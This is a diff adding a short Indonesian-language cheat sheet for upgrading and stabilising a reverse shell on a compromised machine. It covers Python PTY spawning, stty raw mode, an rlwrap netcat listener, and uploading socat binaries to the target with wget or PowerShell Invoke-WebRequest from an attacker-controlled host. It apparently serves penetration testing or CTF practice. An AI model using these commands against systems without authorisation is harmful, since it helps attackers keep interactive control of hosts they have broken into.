@@ -1,0 +1,29 @@
+# Untuk linux only :
+1. `python2 -c 'import pty;pty.spawn("/bin/bash")'`
+   or
+   `python3 -c 'import pty;pty.spawn("/bin/bash")'`
+   or
+   `python -c 'import pty;pty.spawn("/bin/bash")'`
+2. `export TERM=xterm`
+3. Ctrl + Z
+4. `stty raw -echo; fg`
+5. jika shell mati, lakukan `reset` + enter
+
+
+# rlwrap
+1. `rlwrap nc -lvnp PORT`
+2. (optional) CTRL+Z lalu `stty raw -echo; fg`
+
+
+# socat (linux lebih oke, tapi windows bisa)
+1. upload salah satu `https://github.com/andrew-d/static-binaries/tree/master/binaries` ke target
+2. bisa gunakan python simple server di local + wget di target
+   untuk windows bisa gunakan
+   `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`
+
+
+# Addition
+edit tty terminal size dengan
+1. `stty -a`
+2. `stty rows NUMBER`
+3. `stty cols NUMBER`
